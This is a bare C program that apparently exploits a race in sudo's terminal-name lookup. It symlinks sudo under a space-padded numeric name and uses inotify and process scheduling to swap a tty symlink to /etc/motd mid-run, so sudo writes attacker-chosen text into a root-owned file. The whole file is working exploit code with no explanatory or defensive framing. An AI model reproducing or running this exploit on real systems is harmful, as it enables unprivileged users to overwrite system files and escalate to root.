#define _GNU_SOURCE
#include <errno.h>
#include <linux/sched.h>
#include <pty.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )


int main( )
{

	int length, i = 0;
  int fd;
  int wd;
  char buffer[EVENT_BUF_LEN];

	int master, slave;
	char pts_path[256];

	cpu_set_t  mask;
	struct sched_param params;
	params.sched_priority = 0;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);

	mkdir("/dev/shm/_tmp", 0755);
	symlink("/dev/pts/57", "/dev/shm/_tmp/_tty");
	symlink("/usr/bin/sudo", "/dev/shm/_tmp/     34873 ");

	fd = inotify_init();
	wd = inotify_add_watch( fd, "/dev/shm/_tmp", IN_OPEN | IN_CLOSE_NOWRITE );

 	pid_t pid = fork();

	if(pid == 0) {
		sched_setaffinity(pid, sizeof(mask), &mask);
		sched_setscheduler(pid, SCHED_IDLE, &params);
		setpriority(PRIO_PROCESS, pid, 19);

		sleep(1);
		execlp("/dev/shm/_tmp/     34873 ", "sudo", "-r", "unconfined_r", "/usr/bin/sum", "--\nHELLO\nWORLD\n", NULL);
	}else{
		setpriority(PRIO_PROCESS, 0, -20);
		int state = 0;
		while(1) {
			length = read( fd, buffer, EVENT_BUF_LEN );
			kill(pid, SIGSTOP);

			i=0;
			while ( i < length ) {
				struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];

				if ( event->mask & IN_OPEN ) {
					//kill(pid, SIGSTOP);

					while(strcmp(pts_path,"/dev/pts/57")){
						openpty(&master, &slave, &pts_path[0], NULL, NULL);
					};
					//kill(pid, SIGCONT);
					break;

				}else if ( event->mask & IN_CLOSE_NOWRITE ) {
					//kill(pid, SIGSTOP);

					unlink("/dev/shm/_tmp/_tty");
					symlink("/etc/motd", "/dev/shm/_tmp/_tty");
					//kill(pid, SIGCONT);

					state = 1;
					break;
				}

				i += EVENT_SIZE + event->len;

			}
			kill(pid, SIGCONT);
			if(state == 1) break;
		}

		waitpid(pid, NULL, 0);
		inotify_rm_watch( fd, wd );
		close( fd );
		close(wd);

		unlink("/dev/shm/_tmp/_tty");
		unlink("/dev/shm/_tmp/     34873 ");
		rmdir("/dev/shm/_tmp");
		close(master);
		close(slave);
	}

}